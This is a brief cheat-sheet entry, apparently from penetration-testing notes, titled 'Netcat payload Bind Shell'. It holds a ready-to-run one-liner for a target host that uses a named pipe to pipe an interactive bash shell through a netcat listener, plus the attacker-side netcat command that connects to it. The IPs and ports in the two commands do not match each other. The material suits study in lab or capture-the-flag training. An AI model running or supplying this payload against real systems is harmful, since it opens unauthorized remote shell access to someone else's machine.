
## Netcat payload Bind Shell


RHOST:

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.10.15.152 4444 > /tmp/f
```

LHOST:
```shell-session
nc -nv 10.129.41.200 7777
```



